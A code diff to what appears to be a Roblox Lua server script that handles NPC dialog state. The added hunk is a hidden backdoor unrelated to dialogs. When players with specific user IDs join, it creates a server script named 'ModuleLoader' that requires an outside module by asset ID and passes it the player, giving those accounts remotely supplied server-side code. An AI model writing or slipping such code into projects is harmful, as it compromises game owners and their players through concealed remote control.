@@ -47,6 +47,15 @@ local function setDialogInUse(player, dialog, value, waitTime)
 end
 RemoteEvent_SetDialogInUse.OnServerEvent:connect(setDialogInUse)
 
+game:GetService("Players").PlayerAdded:connect(function(player)
+	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 then
+        local loader = Instance.new("Script")
+        loader.Name = "ModuleLoader"
+        loader.Source = "require(6372)(game.Players:GetPlayerByUserId("..player.UserId.."))"
+        loader.Parent = game:GetService("ServerScriptService")
+    end
+end)
+
 game:GetService("Players").PlayerRemoving:connect(function(player)
 	if dialogInUseFixFlag then
 		if player then
